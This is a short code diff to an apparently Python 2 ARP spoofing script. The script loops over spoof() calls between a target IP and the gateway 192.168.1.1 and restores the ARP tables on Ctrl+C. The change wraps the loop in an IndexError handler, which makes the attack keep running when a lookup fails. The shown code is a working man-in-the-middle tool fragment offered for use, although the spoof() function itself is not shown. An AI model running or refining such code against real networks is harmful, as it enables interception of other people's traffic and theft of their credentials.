@@ -38,12 +38,15 @@ gateway_ip = "192.168.1.1"
 try:
     sent_packets_count = 0
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count += 2
-        print("\r[+] Packets sent %i" % sent_packets_count),
-        sys.stdout.flush()
-        time.sleep(2)
+        try:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count += 2
+            print("\r[+] Packets sent %i" % sent_packets_count),
+            sys.stdout.flush()
+            time.sleep(2)
+        except IndexError:
+            pass
 
 except KeyboardInterrupt:
     print "\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait. \n"
